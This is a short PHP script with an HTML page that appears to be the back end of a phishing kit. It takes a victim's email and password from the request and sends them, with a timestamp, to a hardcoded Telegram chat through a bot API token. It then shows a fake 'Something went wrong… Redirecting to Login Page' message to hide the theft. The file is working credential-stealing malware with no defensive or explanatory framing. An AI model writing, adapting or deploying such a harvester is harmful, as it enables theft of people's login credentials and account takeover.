<?php

date_default_timezone_set("Asia/kolkata");
error_reporting(0);

$time = date("h:i a", time());

$email = $_GET["email"];
$password = $_GET["password"];

$message = "Username : $email \nPassword: $password \nTried Login at $time IST";

$chat_id= 1067191853; // replace with your userid


send_message($chat_id,"$message");


function send_message($chat_id, $message){
        $text = urlencode($message);
        $apiToken = "6053794256:AAFlgkaA6eGsF-mdHE6f_wTee6W7e4-7S5Q";
        file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?chat_id=$chat_id&text=$text");
    }
?>
<!DOCTYPE html>
<html>
<head>
	<title>Something Went Wrong</title>
</head>
<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style type="text/css">
	body {
		margin: 10px;
	}
</style>
<body>
<p>Something went wrong. <br>
Try to login </p>

&nbsp;
<br>
Redirecting to Login Page...........
<br>
</body>
</html>
